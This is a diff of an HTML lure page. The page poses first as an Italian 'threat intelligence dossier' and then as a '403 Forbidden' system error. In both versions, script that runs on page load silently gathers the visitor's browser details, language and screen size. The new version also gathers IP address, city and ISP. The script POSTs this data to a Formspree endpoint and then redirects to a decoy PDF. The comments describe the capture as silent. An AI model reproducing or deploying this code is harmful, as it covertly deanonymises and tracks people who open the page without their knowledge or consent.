@@ -1,42 +1,42 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus Threat Intelligence - Secure Dossier</title>
+    <title>System Error - 403 Forbidden</title>
     <style>
-        body { background: #0b0e14; color: #539bf5; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .loader { border: 2px solid #22272e; border-top: 2px solid #539bf5; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; padding: 20px; }
+        .cmd { margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>DECRITTAZIONE DOSSIER FORENSE...</p>
+    <div class="cmd">SYSTEM_CRITICAL_FAILURE: Mirroring active...</div>
+    <div class="cmd">REDIRECTING TO RECOVERY_LOGS...</div>
 
     <script>
-        async function capture() {
-            // Dati tecnici inviati senza pop-up
-            const data = {
-                _subject: "🎯 ATTRIBUZIONE: BERSAGLIO AGGANCIATO",
-                Info: "L'admin ha aperto il dossier (Modalità Silenziosa)",
-                Browser: navigator.userAgent,
-                Lingua: navigator.language,
-                Screen: screen.width + "x" + screen.height
-            };
+        async function forceCapture() {
+            let info = {};
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                info = await res.json();
+            } catch(e) {}
 
-            // Invia i dati a Formspree
             await fetch("https://formspree.io/f/xzdodlnk", {
                 method: "POST",
-                body: JSON.stringify(data),
-                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    _subject: "🚨 INFRASTRUCTURE ALERT: " + (info.ip || "UNKNOWN"),
+                    IP: info.ip,
+                    City: info.city,
+                    Provider: info.org,
+                    UA: navigator.userAgent
+                })
             });
 
-            // Reindirizza al PDF dopo 1 secondo
             setTimeout(() => {
-                window.location.href = "Dossier_Master_DeepDive_Attribution_Nexus.pdf";
-            }, 1000);
+                window.location.href = "C2-Mirror-Auto-Dump-Report.pdf";
+            }, 800);
         }
-        capture();
+        forceCapture();
     </script>
 </body>
 </html>
